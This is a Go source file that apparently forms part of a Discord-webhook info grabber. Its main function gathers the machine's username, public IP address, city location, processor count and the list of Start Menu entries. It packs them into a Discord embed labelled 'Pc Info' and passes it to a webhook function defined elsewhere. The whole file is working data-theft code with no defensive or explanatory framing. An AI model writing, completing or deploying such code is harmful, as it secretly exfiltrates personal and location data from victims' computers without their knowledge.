package main

import (
	"encoding/json"
	"os"
	"strconv"
	"strings"
)

func main() {
	out, _ := os.ReadDir(startMenuPath())
	sb := strings.Builder{}
	for _, e := range out {
		sb.WriteString(e.Name())
		sb.WriteString("\n")
	}

	embed := Embed{"Pc Info", makeWebhookString(), "", Footer{}}
	//embed2 := Embed{"Apps Info", sb.String(), "", Footer{}}
	embeds := Embeds{embeds: []Embed{embed}}
	dm := DiscordMessage{"Why tho", embeds, Footer{}, Author{}}
	println(dm.String())
	webhook(dm.String())

}

func makeWebhookString() string {
	var buffer strings.Builder
	var info IpInfo = NewIpInfo()
	var pcUsername = getPcUsername()
	var dashCount = len(pcUsername) + 2
	buffer.WriteString(strings.Repeat("-", dashCount))
	buffer.WriteString("\n")
	buffer.WriteString("**")
	buffer.WriteString(pcUsername)
	buffer.WriteString("**\n")
	buffer.WriteString(strings.Repeat("-", dashCount))
	buffer.WriteString("\n")
	buffer.WriteString("Location: ")
	buffer.WriteString(info.City)
	buffer.WriteString("\n")
	buffer.WriteString("ip: ")
	buffer.WriteString(info.Ip)
	buffer.WriteString("\n")
	buffer.WriteString("num of processors: ")
	buffer.WriteString(strconv.Itoa(getNumProcessors()))
	buffer.WriteString("\n")
	return buffer.String()
}

func dojson(str string) {
	var result map[string]string
	err := json.Unmarshal([]byte(str), &result)
	DoErr(&err)

	for key, value := range result {
		println(strings.TrimSpace(key), ": ", value)
	}
}

func DoErr(err *error) {
	if *err != nil {
		print((*err).Error())
	}
}
